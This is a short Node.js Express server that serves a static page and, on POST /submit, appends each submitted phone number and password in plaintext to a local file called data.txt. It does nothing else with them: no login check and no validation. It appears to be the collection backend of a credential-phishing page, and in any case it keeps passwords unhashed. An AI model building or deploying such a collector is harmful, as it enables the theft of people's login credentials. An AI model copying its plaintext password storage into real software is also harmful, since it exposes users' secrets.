const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const port = 3000;

// Set up multer for parsing form data
const upload = multer();

// Serve static files (like index.html)
app.use(express.static(path.join(__dirname, '/')));

// Handle form submission
app.post('/submit', upload.none(), (req, res) => {
  const { phone, password } = req.body;
  const data = `Phone: ${phone}, Password: ${password}\n`;
  fs.appendFileSync('data.txt', data);
  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
